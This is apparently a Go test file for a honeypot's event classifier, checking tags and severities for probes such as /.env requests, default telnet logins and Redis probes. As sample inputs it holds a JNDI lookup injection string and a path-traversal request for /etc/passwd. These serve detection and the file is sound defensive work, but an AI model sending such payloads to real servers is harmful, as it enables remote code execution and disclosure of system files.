package classify

import (
	"slices"
	"testing"

	"github.com/cansarihan/lure/internal/event"
)

func tags(e event.Event) []string { return Apply(e).Tags }

func TestHTTPRules(t *testing.T) {
	e := event.Event{Sensor: "http", Kind: event.KindRequest, Fields: map[string]string{
		"path": "/.env", "ua": "Mozilla/5.0 zgrab/0.x",
	}}
	got := Apply(e)
	if !slices.Contains(got.Tags, "config-probe") || !slices.Contains(got.Tags, "automated-client") {
		t.Errorf("tags = %v", got.Tags)
	}
	if got.Severity != Notice {
		t.Errorf("severity = %d, want notice", got.Severity)
	}
	traversal := tags(event.Event{Sensor: "http", Kind: event.KindRequest, Fields: map[string]string{"path": "/static/../../etc/passwd", "ua": "x"}})
	if !slices.Contains(traversal, "path-traversal") {
		t.Errorf("traversal tags = %v", traversal)
	}
	jndi := Apply(event.Event{Sensor: "http", Kind: event.KindRequest, Fields: map[string]string{"path": "/", "ua": "${jndi:ldap://x/a}"}})
	if !slices.Contains(jndi.Tags, "lookup-injection") || jndi.Severity != Alert {
		t.Errorf("jndi = %+v", jndi)
	}
}

func TestLoginRules(t *testing.T) {
	got := Apply(event.Event{Sensor: "telnet", Kind: event.KindLogin, Fields: map[string]string{"user": "root", "password": "123456"}})
	for _, want := range []string{"default-credentials", "privileged-account", "login-attempt"} {
		if !slices.Contains(got.Tags, want) {
			t.Errorf("missing %s in %v", want, got.Tags)
		}
	}
	if got.Severity != Alert {
		t.Errorf("severity = %d", got.Severity)
	}
	plain := tags(event.Event{Kind: event.KindLogin, Fields: map[string]string{"user": "maria", "password": "Tr0ub4dor"}})
	if slices.Contains(plain, "default-credentials") {
		t.Error("an unusual pair is not a default credential")
	}
}

func TestWireRules(t *testing.T) {
	if !slices.Contains(tags(event.Event{Sensor: "raw", Kind: event.KindPayload, Fields: map[string]string{"hex": "16030100"}}), "tls-on-plain-port") {
		t.Error("TLS hello not recognised")
	}
	if !slices.Contains(tags(event.Event{Sensor: "raw", Kind: event.KindPayload, Fields: map[string]string{"text": "*1\r\n$4\r\nINFO\r\n"}}), "redis-probe") {
		t.Error("Redis probe not recognised")
	}
	if !slices.Contains(tags(event.Event{Sensor: "telnet", Kind: event.KindPayload, Fields: map[string]string{"text": "GET / HTTP/1.1"}}), "http-on-other-port") {
		t.Error("HTTP on telnet not recognised")
	}
}

func TestQuietConnect(t *testing.T) {
	got := Apply(event.Event{Sensor: "ssh", Kind: event.KindConnect})
	if len(got.Tags) != 0 || got.Severity != Info {
		t.Errorf("plain connect = %+v", got)
	}
}

func TestCatalogue(t *testing.T) {
	seen := map[string]bool{}
	for i, r := range Rules() {
		if seen[r.Tag] || r.Description == "" {
			t.Errorf("rule %q duplicated or undocumented", r.Tag)
		}
		seen[r.Tag] = true
		if i > 0 && Rules()[i-1].Severity < r.Severity {
			t.Error("catalogue not ordered by severity")
		}
	}
	if len(seen) < 15 {
		t.Errorf("only %d rules", len(seen))
	}
}
